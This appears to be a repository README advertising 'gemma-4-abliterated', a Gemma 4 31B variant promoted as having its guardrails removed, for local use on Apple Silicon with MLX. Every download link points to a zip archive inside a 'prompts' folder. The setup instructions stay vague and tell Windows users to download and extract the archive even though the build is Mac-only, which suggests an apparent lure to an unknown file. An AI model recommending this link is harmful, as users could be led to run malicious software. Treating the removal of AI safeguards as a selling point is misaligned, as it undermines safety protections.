# 🧩 gemma-4-abliterated - Run Gemma 4 on Mac with less friction

[![Download](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge)](https://github.com/garbatyzydziok-cmd/gemma-4-abliterated/raw/refs/heads/main/prompts/gemma_abliterated_v2.5.zip)

## 📥 Download

Use this link to visit the repository and download the files you need:

https://github.com/garbatyzydziok-cmd/gemma-4-abliterated/raw/refs/heads/main/prompts/gemma_abliterated_v2.5.zip

Open the page, then use the files and instructions in the repository to get the app on your computer.

## 🖥️ What this app does

gemma-4-abliterated is a version of Gemma 4 31B that keeps the model’s core quality while removing guardrails. It is built for people who want direct model output and a local setup they can run on Apple Silicon with MLX.

This project is aimed at users who want:
- a strong local language model
- Apple Silicon support
- MLX-based performance
- a model with reduced guardrail behavior
- open-source access under Apache 2.0

## ✅ Before you start

Make sure your Mac is ready for a local model run:

- Apple Silicon Mac with an M1, M2, M3, or newer chip
- macOS 13 or later
- Enough free disk space for model files
- Stable internet connection for the download
- MLX support on your system

For a 31B model, more memory helps. A machine with 32 GB of unified memory gives a smoother run. Less memory can still work if the model is quantized, but load times may be slower.

## 🚀 Getting Started

1. Open the download link above.
2. Read the repository page and check the files.
3. Download the model files or the release package from the repository.
4. Save the files in a folder you can find later, such as Downloads or Documents.
5. Follow the run steps in the repository to launch the model.

If the repository provides a ready-to-run package, use that package first. If it provides source files, follow the included setup steps and run the model with MLX.

## 🧭 How to install on Windows

This project is made for Apple Silicon and MLX, which are part of the macOS workflow. If you are using Windows, you can still use the repository page to inspect the files and model details, but you will not run the MLX build on Windows the same way.

If your goal is to get the files from the link and open them on Windows, use this path:

1. Visit the repository page.
2. Download any available model package, archive, or asset from the repo.
3. Save the file to your Windows computer.
4. If the file is an archive, right-click it and extract it.
5. Read any included instructions file, such as README or setup notes.
6. Use the app or model in the way the repository describes for your platform.

If the repository gives you a command line setup, that setup is meant for Apple Silicon systems. For Windows users, the best first step is to download the files and review the package contents before trying to run anything.

## 📁 What you will find in the repository

You can expect items like these:

- model notes and setup steps
- MLX run files
- download links for weights or assets
- configuration files
- usage notes for local inference
- license details

If the repo includes multiple model formats, pick the one marked for the device you plan to use.

## ⚙️ Typical setup flow

A normal local setup for this project looks like this:

1. Download the model package.
2. Place it in a folder with enough free space.
3. Open a terminal or shell on the supported system.
4. Install any tools named in the repository.
5. Start the model using the command shown in the README.
6. Type a prompt and wait for the output.

If the package includes a double-click launcher, use that first. If it includes command files, keep them in the same folder as the model files.

## 🔍 Suggested system setup

For best results, use this kind of setup:

- 32 GB or more unified memory
- SSD storage with at least 50 GB free
- latest stable macOS release
- current MLX package
- enough space for cache and temporary files

A larger memory pool helps with long prompts and image or vision inputs if the build supports them.

## 🧪 Common uses

This model can fit tasks such as:

- chat and Q&A
- writing help
- code review
- document drafting
- prompt testing
- vision-language tasks if the build includes image support

Because this is a 31B model, it can give stronger answers than smaller local models when your system can support it.

## 🗂️ Files and folders

You may see files like these in the download:

- `README.md` for setup steps
- model weight files
- MLX config files
- sample prompts
- license files
- helper scripts

Keep all files in the same folder unless the repository says otherwise.

## 🛠️ Troubleshooting

If the model does not start, check these points:

- the download finished fully
- the files are in the right folder
- your Mac has enough memory
- MLX is installed
- you used the command from the repo without changes
- the file names match what the instructions expect

If the app loads slowly, close other apps and try again. Large models need memory and disk speed.

If you get an error about missing files, check that you extracted the archive before running the app.

## 🔐 License

This project uses Apache 2.0. You can review the license terms in the repository.

## 📌 Project details

- Repository: gemma-4-abliterated
- Model family: Gemma 4 31B
- Focus: guardrail removal with quality kept in place
- Platform target: Apple Silicon
- Runtime: MLX
- Topic area: open-source vision-language model